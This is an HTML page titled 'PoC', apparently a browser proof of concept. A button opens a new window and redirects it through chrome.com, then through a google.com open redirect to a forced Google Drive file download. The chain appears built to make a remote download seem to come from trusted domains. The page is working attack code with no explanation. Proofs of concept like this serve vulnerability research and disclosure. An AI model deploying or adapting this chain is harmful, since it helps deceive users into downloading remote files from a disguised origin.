```html
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PoC</title>

<script>

function chainRedirect(w, urls, index = 0) {
  if (index >= urls.length) return;

  w.location.replace(urls[index]);

  setTimeout(() => {
    chainRedirect(w, urls, index + 1);
  }, 1000);
}

function startRedirect() {

  let w = window.open("about:blank");

  const urls = [
    "https://chrome.com",
    "https://www.google.com/url?q=https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=2fd86e2c-3607-49fa-9e91-ac198eae5e46&at=AGN2oQ1rJLXpYieZleCfJPt2IM4z:1773900320983"
  ];

  setTimeout(() => {
    chainRedirect(w, urls);
  }, 1000);

}

</script>
</head>

<body>

<button onclick="startRedirect()">Start Redirect</button>

</body>
</html>
